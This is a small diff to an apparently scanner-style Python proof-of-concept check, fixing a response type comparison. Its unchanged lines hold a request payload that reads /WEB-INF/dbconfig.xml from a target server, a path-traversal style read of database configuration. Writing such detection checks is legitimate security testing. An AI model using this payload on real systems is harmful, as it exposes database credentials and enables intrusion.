@@ -54,7 +54,7 @@ class Poc(ABPoc):
             }
             data = '''recType=2&isgps=1&pageRows=3&url=%2FWEB-INF%2Fdbconfig.xml&gpsPosType=00048068&keywords='''
             response = requests.post(vul_url, headers=headers, data=data)
-            if response.status_code == 200 and 'xml version' in response.content:
+            if response.status_code == 200 and 'xml version' in response.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
